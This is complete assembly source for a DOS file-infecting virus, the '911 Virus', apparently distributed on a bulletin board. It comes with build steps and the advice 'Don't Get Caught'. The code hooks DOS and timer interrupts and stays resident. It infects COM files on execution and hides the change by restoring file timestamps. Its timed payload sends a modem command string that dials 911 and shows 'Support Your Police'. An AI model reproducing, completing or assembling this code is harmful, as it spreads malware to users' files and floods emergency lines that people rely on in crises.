PAGE  59,132

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл								         лл
;лл			        911 Virus			         лл
;лл								         лл
;лл This program is the 911 Virus.  Use at your own risk.  When the      лл
;лл manipulation task begins, it will dial 911 through your modem        лл
;лл and display "Support Your Police" on the screen.		         лл
;лл								         лл
;лл Assemble under Borland's Turbo Asm 2.x			         лл
;лл Link - ignore no stack segment error			         лл
;лл run EXE2BIN 911.EXE 911.COM					         лл
;лл								         лл
;лл And remember ... Don't Get Caught.				         лл
;лл								         лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

data_1e		equ	0FE12h			;*
data_2e		equ	437h			;*
data_3e		equ	438h			;*
psp_envirn_seg	equ	2Ch
psp_cmd_size	equ	80h
psp_cmd_tail	equ	81h
data_37e	equ	541h			;*

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a

		org	100h

v911		proc	far

start:
		jmp	loc_40

v911		endp

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;
;			External Entry Point
;
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

int_21h_entry	proc	far
		pushf				; Push flags
		cmp	ah,0E0h
		jne	loc_3			; Jump if not equal
		mov	ax,0DADAh
		popf				; Pop flags
		iret				; Interrupt return
int_21h_entry	endp

loc_3:
		cmp	ah,0E1h
		jne	loc_4			; Jump if not equal
		mov	ax,cs
		popf				; Pop flags
		iret				; Interrupt return
loc_4:
		cmp	ax,4B00h
		je	loc_7			; Jump if equal
loc_5:
		popf				; Pop flags
		jmp	dword ptr cs:data_5
data_5		dd	29A138Dh
data_7		dd	70022Bh
data_9		db	0
data_10		db	8
data_11		db	10h
data_12		db	9
data_13		db	34h
data_14		dw	0
		db	0
data_15		db	0
data_16		db	0
data_17		db	0
data_18		db	43h
		db	 4Fh, 4Dh
data_19		dw	5
data_20		dw	2
		db	0, 0
data_21		dw	1301h
data_22		dw	12ACh
data_23		dw	0FFFEh
data_24		dw	9B70h
data_25		dw	3D5Bh
data_26		dw	20h
data_27		dw	0EC2h
data_28		dw	6E68h
		db	 00h, 00h, 81h, 00h
data_29		dw	12ACh
		db	 5Ch, 00h
data_30		dw	12ACh
		db	 6Ch, 00h
data_31		dw	12ACh
loc_7:
		push	ds
		push	bx
		push	si
		push	cx
		push	ax
		push	dx
		push	bp
		push	es
		push	di
		cld				; Clear direction
		push	dx
		push	ds
		xor	cx,cx			; Zero register
		mov	si,dx
loc_8:
		mov	al,[si]
		cmp	al,0
		je	loc_9			; Jump if equal
		inc	cx
		inc	si
		jmp	short loc_8
loc_9:
		add	dx,cx
		sub	dx,3
		mov	si,offset data_18
		mov	di,dx
		cmp	byte ptr [di-3],4Eh	; 'N'
		jne	loc_10			; Jump if not equal
		cmp	byte ptr [di-2],44h	; 'D'
		je	loc_13			; Jump if equal
loc_10:
		mov	cx,3

locloop_11:
		mov	al,cs:[si]
		cmp	al,[di]
		jne	loc_13			; Jump if not equal
		inc	si
		inc	di
		loop	locloop_11		; Loop if cx > 0

		pop	ds
		pop	dx
		push	dx
		push	ds
		mov	si,dx
		mov	dl,0
		cmp	byte ptr [si+1],3Ah	; ':'
		jne	loc_12			; Jump if not equal
		mov	dl,[si]
		and	dl,0Fh
loc_12:
		mov	ah,36h			; '6'
		int	21h			; DOS Services  ah=function 36h
						;  get drive info, drive dl,1=a:
						;   returns ax=clust per sector
						;   bx=avail clust,cx=bytes/sect
						;   dx=clusters per drive
		cmp	ax,0FFFFh
		je	loc_13			; Jump if equal
		jmp	short loc_15
		db	90h
loc_13:
		jmp	loc_21
		jmp	loc_22
loc_14:
		jmp	loc_19
		jmp	loc_20
loc_15:
		cmp	bx,3
		jb	loc_13			; Jump if below
		pop	ds
		pop	dx
		push	ds
		push	dx
		mov	cs:data_24,ds
		mov	cs:data_25,dx
		mov	ax,4300h
		int	21h			; DOS Services  ah=function 43h
						;  get attrb cx, filename @ds:dx
		mov	cs:data_26,cx
		mov	ax,4301h
		xor	cx,cx			; Zero register
		int	21h			; DOS Services  ah=function 43h
						;  set attrb cx, filename @ds:dx
		mov	bx,0FFFFh
		mov	ah,48h			; 'H'
		int	21h			; DOS Services  ah=function 48h
						;  allocate memory, bx=bytes/16
		mov	ah,48h			; 'H'
		int	21h			; DOS Services  ah=function 48h
						;  allocate memory, bx=bytes/16
		mov	cs:data_21,ax
		mov	ax,cs
		mov	ds,ax
		mov	dx,data_37e
		mov	ah,1Ah
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA(disk xfer area) ds:dx
		pop	dx
		pop	ds
		mov	ax,3D02h
		clc				; Clear carry flag
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		jc	loc_14			; Jump if carry Set
		mov	bx,ax
		mov	cs:data_19,ax
		mov	cx,0FFFFh
		mov	ax,cs:data_21
		mov	ds,ax
		mov	dx,data_2e
		mov	ah,3Fh			; '?'
		clc				; Clear carry flag
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer
		jc	loc_14			; Jump if carry Set
		mov	cs:data_20,ax
		cmp	ax,0E000h
		ja	loc_14			; Jump if above
		cmp	ax,437h
		jb	loc_17			; Jump if below
		mov	si,data_3e
		add	si,si
		sub	si,15h
		mov	cx,13h
		mov	di,offset data_35

locloop_16:
		mov	al,[si]
		mov	ah,cs:[di]
		cmp	ah,al
		jne	loc_17			; Jump if not equal
		inc	si
		inc	di
		loop	locloop_16		; Loop if cx > 0

		jmp	short loc_19
		db	90h
loc_17:
		mov	ax,4200h
		mov	bx,cs:data_19
		xor	cx,cx			; Zero register
		mov	dx,cx
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		jc	loc_19			; Jump if carry Set
		mov	si,100h
		mov	cx,437h
		xor	di,di			; Zero register
		mov	ax,cs:data_21
		mov	ds,ax

locloop_18:
		mov	al,cs:[si]
		mov	[di],al
		inc	si
		inc	di
		loop	locloop_18		; Loop if cx > 0

		mov	ax,5700h
		mov	bx,cs:data_19
		int	21h			; DOS Services  ah=function 57h
						;  get file date+time, bx=handle
						;   returns cx=time, dx=time
		mov	cs:data_28,cx
		mov	cs:data_27,dx
		mov	ax,cs:data_21
		mov	ds,ax
		mov	si,data_2e
		mov	al,[si]
		add	al,0Bh
		mov	[si],al
		xor	dx,dx			; Zero register
		mov	cx,cs:data_20
		add	cx,437h
		mov	bx,cs:data_19
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		mov	cx,cs:data_28
		mov	dx,cs:data_27
		mov	bx,cs:data_19
		mov	ax,5701h
		int	21h			; DOS Services  ah=function 57h
						;  set file date+time, bx=handle
						;   cx=time, dx=time
loc_19:
		mov	bx,cs:data_19
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		push	cs
		pop	ds
loc_20:
		mov	dx,psp_cmd_size
		mov	ah,1Ah
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA(disk xfer area) ds:dx
		mov	ax,cs:data_21
		mov	es,ax
		mov	ah,49h			; 'I'
		int	21h			; DOS Services  ah=function 49h
						;  release memory block, es=seg
		mov	ax,cs:data_24
		mov	ds,ax
		mov	dx,cs:data_25
		mov	ax,4301h
		mov	cx,cs:data_26
		int	21h			; DOS Services  ah=function 43h
						;  set attrb cx, filename @ds:dx
		jmp	short loc_22
		db	90h
loc_21:
		pop	ds
		pop	dx
		jmp	short loc_22
		db	90h
loc_22:
		pop	di
		pop	es
		pop	bp
		pop	dx
		pop	ax
		pop	cx
		pop	si
		pop	bx
		pop	ds
		jmp	loc_5

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;
;			External Entry Point
;
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

int_08h_entry	proc	far
		push	bp
		push	ds
		push	es
		push	ax
		push	bx
		push	cx
		push	dx
		push	si
		push	di
		pushf				; Push flags
		call	cs:data_7
		call	sub_1
		push	cs
		pop	ds
		mov	ah,5
		mov	ch,data_11
		cmp	ah,ch
		ja	loc_24			; Jump if above
		mov	ah,6
		cmp	ah,ch
		jb	loc_24			; Jump if below
		mov	ah,data_9
		cmp	ah,1
		je	loc_23			; Jump if equal
		mov	ah,1
		mov	data_9,ah
		jmp	short loc_24
		db	90h
loc_23:
		call	sub_2
		inc	data_14
		mov	ax,data_14
		cmp	ax,21Ch
		jne	loc_24			; Jump if not equal
		xor	ax,ax			; Zero register
		mov	data_9,ah
		mov	data_14,ax
		mov	data_16,ah
loc_24:
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		pop	es
		pop	ds
		pop	bp
		iret				; Interrupt return
int_08h_entry	endp


;пппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппп
;			       SUBROUTINE
;мммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммм

sub_1		proc	near
		push	cs
		pop	ds
		xor	al,al			; Zero register
		mov	ah,data_10
		cmp	ah,11h
		jne	loc_28			; Jump if not equal
		mov	ah,data_13
		cmp	ah,3Bh			; ';'
		jne	loc_29			; Jump if not equal
		mov	ah,data_12
		cmp	ah,3Bh			; ';'
		jne	loc_30			; Jump if not equal
		mov	ah,data_11
		cmp	ah,17h
		jne	loc_31			; Jump if not equal
		mov	data_11,al
loc_25:
		mov	data_12,al
loc_26:
		mov	data_13,al
loc_27:
		mov	data_10,al
		retn
loc_28:
		inc	data_10
		retn
loc_29:
		inc	data_13
		jmp	short loc_27
loc_30:
		inc	data_12
		jmp	short loc_26
loc_31:
		inc	data_11
		jmp	short loc_25
sub_1		endp

data_32		db	'+++aTh0m0s7=35dp911'
		db	7 dup (2Ch)

;пппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппп
;			       SUBROUTINE
;мммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммм

sub_2		proc	near
		mov	al,data_16
		cmp	al,1
		je	loc_ret_39		; Jump if equal
		mov	al,data_17
		cmp	al,1
		je	loc_33			; Jump if equal
		mov	cx,3

locloop_32:
		mov	dx,cx
		xor	ah,ah			; Zero register
		mov	al,83h
		int	14h			; RS-232   dx=com4, ah=func 00h
						;  reset port, al=init parameter
		loop	locloop_32		; Loop if cx > 0

		mov	al,1
		mov	data_17,al
		jmp	short loc_ret_39
		db	90h
loc_33:
		push	cs
		pop	ds
		mov	si,offset data_32	; ('+++aTh0m0s7=35dp911')
		mov	al,data_15
		cmp	al,1Ah
		jne	loc_36			; Jump if not equal
		jmp	short loc_37
		db	90h
loc_36:
		xor	ah,ah			; Zero register
		add	si,ax
		mov	al,[si]
		mov	dx,3F8h
		out	dx,al			; port 3F8h, RS232-1 xmit buffr
		mov	dx,2F8h
		out	dx,al			; port 2F8h, RS232-2 xmit buffr
		mov	dx,2E8h
		out	dx,al			; port 2E8h, 8514 Horiz total
		mov	dx,3E8h
		out	dx,al			; port 3E8h ??I/O Non-standard
		inc	data_15
		jmp	short loc_ret_39
		db	90h
loc_37:
		mov	cx,3

locloop_38:
		mov	dx,cx
		mov	al,0Dh
		mov	ah,1
		int	14h			; RS-232   dx=com4, ah=func 01h
						;  write char al, ah=retn status
		loop	locloop_38		; Loop if cx > 0

		mov	ax,1
		mov	data_16,al
		mov	data_15,ah
		mov	data_17,ah

loc_ret_39:
		retn
sub_2		endp

loc_40:
		mov	ah,0E0h
		int	21h			; ??INT Non-standard interrupt
		cmp	ax,0DADAh
		jne	loc_41			; Jump if not equal
		jmp	loc_44
loc_41:
		push	cs
		pop	ds
		mov	ax,3521h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	word ptr data_5,bx
		mov	word ptr data_5+2,es
		mov	dx,offset int_21h_entry
		mov	ax,2521h
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		mov	ax,3508h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	word ptr data_7,bx
		mov	word ptr data_7+2,es
		mov	dx,offset int_08h_entry
		mov	ax,2508h
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		mov	ah,2Ch			; ','
		int	21h			; DOS Services  ah=function 2Ch
						;  get time, cx=hrs/min, dx=sec
		mov	data_11,ch
		mov	data_12,cl
		mov	data_13,dh
		mov	ax,cs:psp_envirn_seg
		mov	ds,ax
		xor	si,si			; Zero register
loc_42:
		mov	al,[si]
		cmp	al,1
		je	loc_43			; Jump if equal
		inc	si
		jmp	short loc_42
loc_43:
		inc	si
		inc	si
		mov	dx,si
		mov	ax,cs
		mov	es,ax
		mov	bx,5Ah
		mov	ah,4Ah			; 'J'
		int	21h			; DOS Services  ah=function 4Ah
						;  change memory allocation
						;   bx=bytes/16, es=mem segment
		mov	bx,cs:psp_cmd_tail
		mov	ax,cs
		mov	es,ax
		mov	cs:data_30,ax
		mov	cs:data_31,ax
		mov	cs:data_29,ax
		mov	ax,4B00h
		mov	cs:data_22,ss
		mov	cs:data_23,sp
		pushf				; Push flags
		call	cs:data_5
		mov	ax,cs:data_22
		mov	ss,ax
		mov	ax,cs:data_23
		mov	sp,ax
		mov	ax,cs
		mov	ds,ax
		mov	dx,537h
		int	27h			; Terminate & stay resident
						;  dx=offset last byte+1, cs=PSP
loc_44:
		mov	ah,0E1h
		int	21h			; ??INT Non-standard interrupt
		mov	si,4F3h
		mov	cs:[si+3],ax
		mov	ax,4F8h
		mov	cs:[si+1],ax
		mov	ax,cs:data_20
		mov	bx,cs
;*		jmp	far ptr loc_1		;*
		db	0EAh, 00h, 00h, 00h, 00h
		db	 8Bh,0C8h, 8Eh,0DBh
		db	0BEh, 00h, 01h
		db	0BFh, 37h, 05h

locloop_45:
		mov	al,[di]
		mov	[si],al
		inc	si
		inc	di
		loop	locloop_45		; Loop if cx > 0

		mov	si,51Fh
		mov	cs:[si+3],ds
		mov	al,byte ptr ds:[100h]
		sub	al,0Bh
		mov	byte ptr ds:[100h],al
		mov	ax,ds
		mov	es,ax
		mov	ss,ax
		jmp	far ptr start
data_35		db	'Support Your Police'
data_36		db	0D8h
		db	20h

seg_a		ends



		end	start

; ЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭ
; This quality file was downloaded from
;
;          E  X  T  R  E  M  E
;       ------------+------------      кФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФП
;                  /|\                  Г                                 Г
;                 / | \                 Г   Portland Metro All Text BBS   Г
;                /  |  \                Г                                 Г
;               /   |   \               Г        9600: 503-775-0374       Г
;              /    |    \              Г         SysOp: Thing One        Г
;             /     |     \             Г                                 Г
;            /      |      \           РФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФй
;             d r e a m e s
